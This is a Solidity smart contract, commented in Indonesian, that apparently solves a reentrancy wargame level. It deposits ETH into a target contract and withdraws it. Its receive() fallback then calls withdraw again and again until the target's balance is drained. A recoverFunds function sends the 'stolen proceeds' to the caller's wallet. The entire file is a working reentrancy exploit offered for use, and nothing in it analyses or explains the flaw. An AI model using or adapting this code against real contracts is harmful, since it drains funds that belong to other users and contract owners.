// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    IReentrance public target;
    uint256 public initialDeposit;

    constructor(address _targetAddress) public {
        target = IReentrance(_targetAddress);
    }

    // Fungsi utama untuk memulai serangan
    function attack() external payable {
        require(msg.value >= 0.001 ether, "Need some ETH to start");
        initialDeposit = msg.value;

        // 1. Donasi dulu agar kita terdaftar punya saldo di sana
        target.donate{value: initialDeposit}(address(this));

        // 2. Tarik uangnya kembali (ini akan memicu loop re-entrancy)
        target.withdraw(initialDeposit);
    }

    // Fungsi ini terpanggil otomatis saat target mengirim ETH
    receive() external payable {
        // Cek apakah target masih punya uang?
        uint256 targetBalance = address(target).balance;
        
        if (targetBalance > 0) {
            // Jika sisa uang target lebih kecil dari deposit kita, tarik sisanya saja
            uint256 toWithdraw = targetBalance < initialDeposit ? targetBalance : initialDeposit;
            
            // RE-ENTRANCY HAPPENS HERE!
            // Kita panggil withdraw lagi sebelum transaksi sebelumnya selesai update saldo
            target.withdraw(toWithdraw);
        }
    }
    
    // Fungsi untuk mengambil hasil curian ke wallet pribadi Anda
    function recoverFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}